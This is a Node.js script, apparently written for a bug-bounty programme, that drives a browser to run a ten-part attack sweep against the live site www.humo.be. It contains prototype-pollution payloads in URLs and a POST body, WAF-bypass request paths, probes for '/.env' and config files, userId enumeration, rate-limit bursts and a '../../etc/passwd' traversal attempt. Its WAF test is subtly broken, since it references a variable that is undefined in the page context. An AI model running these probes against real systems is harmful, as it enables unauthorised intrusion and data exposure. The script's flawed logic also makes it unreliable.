// humo_deep_sweep.js — comprehensive attack sweep on www.humo.be.
// 10 test categories drawn from the full Titan corpus.
const http = require('http');
const fs = require('fs');
const path = require('path');
const DIR = path.join(__dirname, '..', 'findings', 'bounties', 'humo-h1');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 15000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');
  await cdp(ws, 'Network.enable');
  await cdp(ws, 'Network.setExtraHTTPHeaders', {
    headers: { 'X-Intigriti-Username': 'greenbird122' }
  });

  const evalJS = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', { expression: expr, returnByValue: true });
    return r.result.value;
  };

  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: '(async () => { ' + expr + ' })()',
      awaitPromise: true, returnByValue: true
    });
    return r.result.value;
  };

  var results = {};

  // Navigate to Humo
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 6000));

  // ===== 1. PROTOTYPE POLLUTION — XSS =====
  console.log('=== 1. PROTOTYPE POLLUTION ===');
  var pp = await evalJS([
    '(function(){',
    '  Object.prototype.titan_test = "polluted";',
    '  var t = {};',
    '  var r1 = t.titan_test === "polluted";',
    '  delete Object.prototype.titan_test;',
    '  Object.prototype.children = "PP_CHILDREN";',
    '  var el = document.createElement("div");',
    '  var r2 = el.children === "PP_CHILDREN";',
    '  delete Object.prototype.children;',
    '  return JSON.stringify({basic: r1, children: r2});',
    '})()'
  ].join('\n'));
  console.log('  baseline: ' + pp);
  results.pp_baseline = pp;

  // URL param pollution
  var ppUrlTests = [
    '__proto__[children]=PP_XSS',
    'constructor[prototype][children]=PP_XSS',
    '__proto__[innerHTML]=PP_XSS',
  ];
  for (var i = 0; i < ppUrlTests.length; i++) {
    await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be/?' + ppUrlTests[i] });
    await new Promise(r => setTimeout(r, 3000));
    var c = await evalJS('(function(){var t={};return t.children||t.innerHTML||"clean";})()'
    );
    console.log('  url: ' + ppUrlTests[i].split('=')[0] + ' -> ' + c);
  }
  results.pp_url = c;

  // JSON body pollution
  console.log('  POST body pollution:');
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 3000));
  var ppBody = await evalAsync(
    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks", { ' +
    'method:"POST", headers:{"Content-Type":"application/json"}, ' +
    'body:"{\\"__proto__\\":{\\\"children\\\":\\"PP_POST\\"}}"' +
    '});' +
    'return r.status + " | " + (await r.text()).slice(0,100);'
  );
  var ppCheck = await evalJS('(function(){var t={};return t.children||"clean";})()'
  );
  console.log('    post: ' + ppBody + ' | check: ' + ppCheck);
  results.pp_post = ppBody + ' | ' + ppCheck;

  // ===== 2. WAF BYPASS TECHNIQUES =====
  console.log('\n=== 2. WAF BYPASS ===');
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 4000));

  // Test various WAF bypass paths
  var wafTests = [
    { name: 'case variation', path: '/API/_NEXT-API/BOOKMARKS?userId=1' },
    { name: 'double encoding', path: '/%256161pi/_next-api/bookmarks?userId=1' },
    { name: 'path traversal', path: '/api/_next-api/bookmarks/../%2f../api/_next-api/bookmarks?userId=1' },
    { name: 'semicolon', path: '/api/_next-api/bookmarks;.json?userId=1' },
    { name: 'null byte', path: '/api/_next-api/bookmarks%00.json?userId=1' },
    { name: 'unicode', path: '/api/_next-api/bookmarks\u003fuserid=1' },
    { name: 'fragment', path: '/api/_next-api/bookmarks?userId=1#test' },
    { name: 'HTTP/1.0', path: '/api/_next-api/bookmarks?userId=1', version: 'HTTP/1.0' },
  ];
  for (var w = 0; w < wafTests.length; w++) {
    var wt = wafTests[w];
    var wr = await evalAsync(
      'var r = await fetch("https://www.humo.be" + wt.path + "");' +
      'return r.status + " | " + (await r.text()).slice(0,100);'
    );
    console.log('  ' + wt.name + ': ' + wr);
    results['waf_' + wt.name] = wr;
  }

  // ===== 3. SOURCE MAP LEAKAGE =====
  console.log('\n=== 3. SOURCE MAPS ===');
  var sm = await evalAsync(
    'var scripts = Array.from(document.querySelectorAll("script[src*=\\"_next\\"]"));' +
    'var results = [];' +
    'for (var i = 0; i < Math.min(scripts.length, 5); i++) {' +
    '  var url = scripts[i].src;' +
    '  var smUrl = url.replace(".js", ".js.map");' +
    '  try {' +
    '    var r = await fetch(smUrl);' +
    '    results.push(smUrl.split("/").pop() + ":" + r.status);' +
    '  } catch(e) { results.push("error"); }' +
    '}' +
    'return results.join(", ");'
  );
  console.log('  ' + sm);
  results.source_maps = sm;

  // ===== 4. ENV VAR / CONFIG LEAKAGE =====
  console.log('\n=== 4. ENV / CONFIG LEAKAGE ===');
  var env = await evalAsync(
    'var envPaths = ["/env.js", "/config.js", "/settings.js", "/_next/data/' +
    'fcfb6998eb14/env.json", "/api/config", "/.env", "/api/env", "/api/settings", ' +
    '"/api/health", "/api/status", "/api/version", "/_next/data/fcfb6998eb14/_app.json"];' +
    'var results = [];' +
    'for (var i = 0; i < envPaths.length; i++) {' +
    '  try {' +
    '    var r = await fetch("https://www.humo.be" + envPaths[i]);' +
    '    if (r.status !== 404) {' +
    '      var t = (await r.text()).slice(0, 200);' +
    '      results.push(envPaths[i] + ":" + r.status + "|" + t.replace(/\n/g," ").slice(0,80));' +
    '    }' +
    '  } catch(e) {}' +
    '}' +
    'return results.length ? results.join("\n") : "all 404";'
  );
  console.log('  ' + env);
  results.env_leakage = env;

  // ===== 5. NEXT.JS RSC / MIDDLEWARE BYPASS =====
  console.log('\n=== 5. NEXT.JS RSC / MIDDLEWARE ===');
  var rsc = await evalAsync(
    'var rscTests = [' +
    '  "/?__nextDataReq=1", ' +
    '  "/?_rsc=1", ' +
    '  "/api/_next-api/v1/auth/login", ' +
    '  "/api/_next-api/v1/auth/callback", ' +
    '  "/middleware-test", ' +
    '  "/_next/development", ' +
    '  "/_next/data/fcfb6998eb14/registreren.json"' +
    '];' +
    'var results = [];' +
    'for (var i = 0; i < rscTests.length; i++) {' +
    '  try {' +
    '    var r = await fetch("https://www.humo.be" + rscTests[i], {' +
    '      headers: {"RSC": "1", "Next-Router-State-Tree": "%5B%22%22%5D"}' +
    '    });' +
    '    var t = (await r.text()).slice(0, 150);' +
    '    results.push(rscTests[i] + ":" + r.status + "" + t.replace(/\n/g," ").slice(0,60));' +
    '  } catch(e) { results.push(rscTests[i] + ":error"); }' +
    '}' +
    'return results.join("\n");'
  );
  console.log('  ' + rsc);
  results.rsc = rsc;

  // ===== 6. CORS HEADERS =====
  console.log('\n=== 6. CORS ===');
  var cors = await evalAsync(
    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=1", {mode:"cors"});' +
    'return JSON.stringify({ origin: r.headers.get("access-control-allow-origin"), ' +
    'methods: r.headers.get("access-control-allow-methods"), ' +
    'credentials: r.headers.get("access-control-allow-credentials") });'
  );
  console.log('  ' + cors);
  results.cors = cors;

  // ===== 7. postMessage =====
  console.log('\n=== 7. postMessage ===');
  var pm = await evalJS([
    '(function(){',
    '  var r = [];',
    '  var html = document.documentElement.outerHTML;',
    '  r.push((html.match(/addEventListener\\s*\\(\\s*["\']message["\']/g)||[]).length + " listeners");',
    '  r.push((html.match(/onmessage/g)||[]).length + " onmessage");',
    '  r.push((html.match(/postMessage/g)||[]).length + " postMessage calls");',
    '  return r.join("; ");',
    '})()'
  ].join('\n'));
  console.log('  ' + pm);
  results.postmessage = pm;

  // ===== 8. SERVICE WORKER =====
  console.log('\n=== 8. SERVICE WORKER ===');
  var sw = await evalAsync(
    'if (!navigator.serviceWorker) return "not supported";' +
    'var regs = await navigator.serviceWorker.getRegistrations();' +
    'if (regs.length === 0) return "none registered";' +
    'return regs.map(function(r){ return r.scope + " | " + (r.installing||r.waiting||r.active||{}).scriptURL; }).join("; ");'
  );
  console.log('  ' + sw);
  results.sw = sw;

  // ===== 9. RATE LIMITING =====
  console.log('\n=== 9. RATE LIMIT (10 rapid) ===');
  var rl = [];
  for (var k = 0; k < 10; k++) {
    var rr = await evalAsync(
      'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=' + (k+1) + '");' +
      'return r.status;'
    );
    rl.push(rr);
  }
  console.log('  statuses: ' + rl.join(', '));
  results.rate_limit = rl.join(',');

  // ===== 10. ERROR PAGE INFO LEAKAGE =====
  console.log('\n=== 10. ERROR PAGES ===');
  var errTests = [
    '/nonexistent-page-12345',
    '/api/_next-api/v1/nonexistent',
    '/%00',
    '/api/_next-api/bookmarks?userId=../../etc/passwd',
  ];
  for (var e = 0; e < errTests.length; e++) {
    var er = await evalAsync(
      'var r = await fetch("https://www.humo.be' + errTests[e] + '");' +
      'var t = (await r.text()).slice(0, 300);' +
      'return r.status + " | " + t.replace(/\n/g," ").slice(0, 150);'
    );
    console.log('  ' + errTests[e] + ': ' + er);
    results['error_' + e] = er;
  }

  // Save all results
  fs.writeFileSync(path.join(DIR, 'deep_sweep_results.json'), JSON.stringify(results, null, 2));
  console.log('\n=== All results saved to deep_sweep_results.json ===');

  ws.close();
}

main().catch(function(e) { console.error(e); process.exit(1); });
